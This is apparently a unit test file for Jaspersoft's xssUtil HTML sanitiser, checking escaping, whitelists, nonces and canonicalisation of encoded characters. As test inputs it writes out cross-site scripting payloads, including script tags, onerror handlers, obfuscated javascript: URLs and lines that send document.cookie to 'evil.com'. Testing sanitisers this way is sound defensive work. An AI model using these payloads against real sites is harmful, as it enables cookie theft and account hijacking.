/*
 * Copyright (C) 2005 - 2022 TIBCO Software Inc. All rights reserved.
 * http://www.jaspersoft.com.
 *
 * Unless you have purchased a commercial license agreement from Jaspersoft,
 * the following license terms apply:
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

import xssUtil from 'src/common/util/xssUtil';
import jrsConfigs from 'src/jrs.configs';

describe("xssUtil", function() {

    it("should not escape a string that is not html", function() {
        expect(xssUtil.softHtmlEscape("onerror")).toEqual("onerror");
    });

    it("should always escape < when it's in '<script'.  script is never white listed", function() {
        expect(xssUtil.softHtmlEscape("<script")).toEqual("&lt;script");
    });

    it("should escape < in '<script>' AND there are multiple 'attacks' on the page.", function() {
        var inStr = "test<script>";
        var outStr = "test&lt;script>";
        expect(xssUtil.softHtmlEscape(inStr)).toEqual(outStr);
        expect(xssUtil.softHtmlEscape(inStr)).toEqual(outStr);
        expect(xssUtil.softHtmlEscape(inStr)).toEqual(outStr);
    });

    it("should always unescape &lt;", function() {
        expect(xssUtil.unescape("&lt;script")).toEqual("<script");
    });

    it("should not escape more than once", function() {
        var str = "<script>alert('XSS');</script>";
        expect(xssUtil.softHtmlEscape(xssUtil.softHtmlEscape(str)))
            .toEqual(xssUtil.softHtmlEscape(str));
    });

    it("should not unescape hard escape during the soft escape (due to canonicalization).  Both escapes should be applied.", function() {
        var dataStr = "<img src=javas&#99;ript:alert('XSS') onerror=alert('XSS')>";
        var templateStr = '<div>' + xssUtil.hardEscape(dataStr) + '</div>';
        expect(xssUtil.softHtmlEscape(templateStr))
            .toEqual("<div>&lt;img src=alert&#40;&#39;XSS&#39;&#41; &#111;&#110;error=alert&#40;&#39;XSS&#39;&#41;&gt;</div>");
    });

    it("should be doubly escaped after soft followed by hard escape.  Soft escape checks for < and > presence before escaping (for efficiency)", function() {
        var str = "<img src=javas&#99;ript:alert('XSS') onerror=alert('XSS')>";

        expect(xssUtil.hardEscape(xssUtil.softHtmlEscape(str)))
            .toEqual("&lt;img src=alert&#40;&#39;XSS&#39;&#41; &#111;&#110;error=alert&#40;&#39;XSS&#39;&#41;&gt;");
    });

    it("should not apply soft escape after hard escape.  Soft escape checks for < and > presence before escaping (for efficiency)", function() {
        var str = "<img src=javas&#99;ript:alert('XSS') onerror=alert('XSS')>";
        var softEsc = xssUtil.softHtmlEscape(str);
        var hardEsc = xssUtil.hardEscape(str);

        expect(xssUtil.hardEscape(softEsc)).not.toEqual(xssUtil.softHtmlEscape(hardEsc));
        expect(xssUtil.softHtmlEscape(hardEsc)).toEqual(xssUtil.hardEscape(str));
    });

    it("should produce identity when xssUtil.unescape(xssUtil.softHtmlEscape)", function() {
        var str = "<script>";
        expect(xssUtil.unescape(xssUtil.softHtmlEscape(str))).toEqual(str);
    });

    it("should not escape whitelisted tags per soft HTML escape", function() {
        expect(xssUtil.softHtmlEscape('<img src="myimg.png"/>')).toEqual('<img src="myimg.png"/>');
    });

    it("should not escape whitelisted tags and comments per soft HTML escape", function() {
        var str = '<img src="myimg.png"/><!--comment-->';
        expect(xssUtil.softHtmlEscape(str)).toEqual(str);
    });

    it("should escape HTML event listener attributes switching the context to javascript", function() {
        expect(xssUtil.softHtmlEscape('<img src="myimg.png" onerror="img.src=\'evil.com?\'+document.cookie"/>'))
            .toEqual('<img src="myimg.png" &#111;&#110;error="img.src=\'evil.com?\'+document.cookie"/>');
    });

    it("should escape srcdoc iframe attribute", function() {
        expect(xssUtil.softHtmlEscape('<iframe srcdoc="&lt;script>"></iframe>'))
            .toEqual('&lt;iframe &#115;&#114;&#99;doc="&lt;script>">&lt;/iframe>');
    });

    it("should escape srcdoc iframe attribute twice", function() {
        expect(xssUtil.softHtmlEscape('<iframe srcdoc="&lt;script><iframe srcdoc="&lt;script>"></iframe>'))
            .toEqual('&lt;iframe &#115;&#114;&#99;doc="&lt;script>&lt;iframe &#115;&#114;&#99;doc="&lt;script>">&lt;/iframe>');
    });

    it("should NOT escape parenthesis during softHtmlEscape. Potentially breaks CSS.", function() {
        expect(xssUtil.softHtmlEscape('<img src="myimg.png" onerror="alert(\'XSS\')"/>'))
            .toEqual('<img src="myimg.png" &#111;&#110;error="alert(\'XSS\')"/>');
    });

    it("should forbid javascript: in html", function() {
        expect(xssUtil.softHtmlEscape('<img src="javascript:img.src=\'evil.com?\'+document.cookie"/>'))
            .toEqual('<img src="img.src=\'evil.com?\'+document.cookie"/>');
    });

    it("should forbid encoded javascript: in html", function() {
        expect(xssUtil.softHtmlEscape('<img src="java&#115;Crip&#84;:img.src=\'evil.com?\'+document.cookie"/>'))
            .toEqual('<img src="img.src=\'evil.com?\'+document.cookie"/>');
    });

    it("should NOT soft escape <div> and <span> due to the custom whitelist, but escape <img>.  Prepend nonce.", function() {
        expect(xssUtil.softHtmlEscape('<div><span><img></span></div>', {whiteList: ['div','span']})).toEqual('<!--@<js-templateNonce></js-templateNonce>@--><div><span>&lt;img></span></div>');
    });

    it("should NOT soft escape <div> and <span> due to the custom whitelist, but escape <img>. Remove nonce.", function() {
        expect(xssUtil.softHtmlEscape(xssUtil.softHtmlEscape('<div><span><img></span></div>', {whiteList: ['div','span']}))).toEqual('<div><span>&lt;img></span></div>');
    });

    it("should NOT soft escape <div>, <span>, and comment (always whitelist'ed) due to the custom whitelist, but escape <img>. Remove nonce.", function() {
        expect(xssUtil.softHtmlEscape(xssUtil.softHtmlEscape('<div><span><img><!--comment--></span></div>', {whiteList: ['div','span']}))).toEqual('<div><span>&lt;img><!--comment--></span></div>');
    });

    it("should hard escape the string after the escape with a custom whitelist applied once. Remove nonce.", function() {
        expect(xssUtil.hardEscape(xssUtil.softHtmlEscape('<div><span><img><!--comment--></span></div>', {whiteList: ['div','span']}))).toEqual('&lt;div&gt;&lt;span&gt;&lt;img&gt;&lt;!--comment--&gt;&lt;/span&gt;&lt;/div&gt;');
    });

    it("should unescape the string after it was whitelisted once. Remove nonce.", function() {
        var str = '<div><img></div>';
        expect(xssUtil.unescape(xssUtil.softHtmlEscape(str, {whiteList: ['div']}))).toEqual(str);
    });

    it("should escape <div> per escapeTags option", function() {
        expect(xssUtil.softHtmlEscape('<div><span><img></span></div>', {escapeTags: ['div']})).toEqual('&lt;div><span><img></span>&lt;/div>');
    });

    it("should NOT convert DOM element to string when escaping", function() {
        var el = document.createElement("div");
        expect(xssUtil.softHtmlEscape(el)).toBe(el);
    });

    it("should NOT convert DOM element to string when unescaping", function() {
        var el = document.createElement("div");
        expect(xssUtil.unescape(el)).toBe(el);
    });

    // jrsConfigs.xssNonce is set up in jrsConfigsMock.js
    it("should NOT escape when a nonce is present in the string", function() {
        var str = "<script><js-templateNonce></js-templateNonce></script>".replace('<js-templateNonce></js-templateNonce>', jrsConfigs.xssNonce);
        expect(xssUtil.softHtmlEscape(str)).toEqual(str);
    });

    it("should hard escape HTML", function() {
        expect(xssUtil.hardEscape('<img src="myimg.png" onerror="alert(\'xss\')"/>'))
            .toEqual('&lt;img src=&quot;myimg.png&quot; onerror=&quot;alert&#40;&#39;xss&#39;&#41;&quot;/&gt;');
    });

    it("should hard escape HTML only once on multiple escapes", function() {
        var imgStr = '<img src="myimg.png" onerror="alert(\'xss\')"/>';
        expect(xssUtil.hardEscape(xssUtil.hardEscape(imgStr)))
            .toEqual(xssUtil.hardEscape(imgStr));
    });

    it("should produce identity when hard escape is followed by unescape", function() {
        var imgStr = '<img src="myimg.png" onerror="alert(\'xss\')"/>';
        expect(xssUtil.unescape(xssUtil.hardEscape(imgStr))).toEqual(imgStr);
    });

    it("should hard escape even when a nonce is present in the string", function() {
        var str = "<script><js-templateNonce></js-templateNonce></script>".replace('<js-templateNonce></js-templateNonce>', jrsConfigs.xssNonce);
        expect(xssUtil.hardEscape(str)).toEqual("&lt;script&gt;&lt;js-templateNonce&gt;&lt;/js-templateNonce&gt;&lt;/script&gt;");
    });

    it("should NOT escape a non-whitelisted tags if the tag is in jrsConfigs.xssHtmlTagWhiteList (via security-config.properties)", function() {
        // These tags are escaped due to jrsConfigsMock.js prop xssHtmlTagWhiteList: '+xss-test-123,xss-test-4567'
        var str = "<xss-test-123>alert</xss-test-123>";
        expect(xssUtil.softHtmlEscape(str)).toEqual(str);

        str = "<xss-test-4567>alert</xss-test-4567>";
        expect(xssUtil.softHtmlEscape(str)).toEqual(str);
    });

    it("should escape a non-whitelisted tag 'xss-test-123' in the string", function() {
        var str = "<xss-test-1234567>alert</xss-test-1234567>";
        var strRes = "&lt;xss-test-1234567>alert&lt;/xss-test-1234567>";
        expect(xssUtil.softHtmlEscape(str)).toEqual(strRes);
    });

    it("should find and remove some special characters from javascript keyword", function() {
        const jsKeyword = 'javascript:';
        const fakeJsKeyword = 'ja\tvasc\r\nript:';
        const fakeJsKeyword2 = 'ja&Tab;vasc\r&NewLine;ript:';

        let prefix = '<div>';
        let middle = '';
        let suffix = '</div>';

        let result = xssUtil.softHtmlEscape(prefix + fakeJsKeyword + middle + fakeJsKeyword + suffix);
        let expected = prefix + middle + suffix;
        expect(result).toEqual(expected);

        result = xssUtil.softHtmlEscape(prefix + fakeJsKeyword2 + middle + fakeJsKeyword2 + suffix);
        expected = prefix + middle + suffix;
        expect(result).toEqual(expected);

        middle = 'asdsds';
        result = xssUtil.softHtmlEscape(prefix + fakeJsKeyword + middle + fakeJsKeyword + suffix);
        // only the first jsKeyword is going to be removed, the second one (is going to stay because it's not considered
        // as a separate word)
        expected = prefix + middle + jsKeyword + suffix;
        expect(result).toEqual(expected);

        middle = 'asdsds ';
        result = xssUtil.softHtmlEscape(prefix + fakeJsKeyword + middle + fakeJsKeyword + suffix);
        // and here the second jsKeyword is going to be a separate word, thus, will be removed
        expected = prefix + middle + suffix;
        expect(result).toEqual(expected);
    });

    it("should escape an iframe tag in the string", function() {
        var str = "<iframe src='content'>alert</iframe>";
        var strRes = "&lt;iframe src='content'>alert&lt;/iframe>";
        expect(xssUtil.softHtmlEscape(str)).toEqual(strRes);
    });


    it("canonicalize() method should decode characters of interest from DEC, HEX and Entity-name encodings into ASCII", function() {

        const characters = '/:=javascriptond';

        const encodings = [
            // DEC encoding of characters
            "&#47&#58&#61&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#111&#110&#100",
            "&#0000047&#0000058&#0000061&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000111&#0000110&#0000100",
            "&#47;&#58;&#61;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#111;&#110;&#100;",
            "&#0000047;&#0000058;&#0000061;&#0000106;&#0000097;&#0000118;&#0000097;&#0000115;&#0000099;&#0000114;&#0000105;&#0000112;&#0000116;&#0000111;&#0000110;&#0000100;",

            // HEX encoding of characters
            "&#x2F&#x3A&#x3D&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x6F&#x6E&#x64",
            "&#x00000002F&#x00000003A&#x00000003D&#x00000006A&#x000000061&#x000000076&#x000000061&#x000000073&#x000000063&#x000000072&#x000000069&#x000000070&#x000000074&#x00000006F&#x00000006E&#x000000064",
            "&#x2F;&#x3A;&#x3D;&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x6F;&#x6E;&#x64;",
            "&#x00000002F;&#x00000003A;&#x00000003D;&#x00000006A;&#x000000061;&#x000000076;&#x000000061;&#x000000073;&#x000000063;&#x000000072;&#x000000069;&#x000000070;&#x000000074;&#x00000006F;&#x00000006E;&#x000000064;",

            // HEX encoding of characters, smaller register but capital '&#X' instead of '&#x'
            "&#X2f&#X3a&#X3d&#X6a&#X61&#X76&#X61&#X73&#X63&#X72&#X69&#X70&#X74&#X6f&#X6e&#X64",
            "&#X00000002f&#X00000003a&#X00000003d&#X00000006a&#X000000061&#X000000076&#X000000061&#X000000073&#X000000063&#X000000072&#X000000069&#X000000070&#X000000074&#X00000006f&#X00000006e&#X000000064",
            "&#X2f;&#X3a;&#X3d;&#X6a;&#X61;&#X76;&#X61;&#X73;&#X63;&#X72;&#X69;&#X70;&#X74;&#X6f;&#X6e;&#X64;",
            "&#X00000002f;&#X00000003a;&#X00000003d;&#X00000006a;&#X000000061;&#X000000076;&#X000000061;&#X000000073;&#X000000063;&#X000000072;&#X000000069;&#X000000070;&#X000000074;&#X00000006f;&#X00000006e;&#X000000064;"
        ];

        for (let i = 0; i < encodings.length; i++) {
            // prefix is used for debugging to understand what string is not equal to expected
            // by looking at error messages in console
            const prefix = 'line ' + (i + 1) + ': ';
            const from = prefix + encodings[i];
            const expected = prefix + characters;
            expect(xssUtil.canonicalize(from)).toEqual(expected);
        }

        // Entity-name encoding of characters
        expect(xssUtil.canonicalize("&sol;&colon;&equals;&tab;&newline;")).toEqual("/:=\t\n");
        expect(xssUtil.canonicalize("&sol&colon&equals&tab&newline")).toEqual("/:=\t\n");
        expect(xssUtil.canonicalize("&SOL;&COLON;&EQuals;&tAB;&nEWliNe;")).toEqual("/:=\t\n");
        expect(xssUtil.canonicalize("&SOL&COLON&EQuals&tAB&nEWliNe")).toEqual("/:=\t\n");
    });

});